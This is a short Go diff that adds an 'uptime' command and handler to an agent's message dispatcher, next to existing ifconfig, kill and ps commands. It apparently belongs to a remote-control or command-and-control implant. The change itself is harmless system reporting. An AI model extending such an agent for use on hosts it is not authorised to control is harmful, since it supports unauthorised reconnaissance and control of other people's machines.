@@ -1159,6 +1159,9 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 
 		case "ifconfig", "ipconfig":
 			c.Stdout, c.Stderr = a.ifconfig()
+
+		case "uptime":
+			c.Stdout, c.Stderr = a.uptime()
 		case "kill":
 			pid, err := strconv.Atoi(p.Args)
 			if err != nil {
@@ -1299,6 +1302,28 @@ func (a *Agent) ps() (stdout string, stderr string) {
 	if a.Verbose {
 		if stderr != "" {
 			message("warn", fmt.Sprintf("There was an error executing ps"))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", stdout)
+		}
+	}
+	return stdout, stderr
+}
+
+func (a *Agent) uptime() (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Running uptime function"))
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing uptime function"))
+	}
+
+	stdout, stderr = Uptime()
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing uptime"))
 			message("success", stdout)
 			message("warn", fmt.Sprintf("Error: %s", stderr))
 
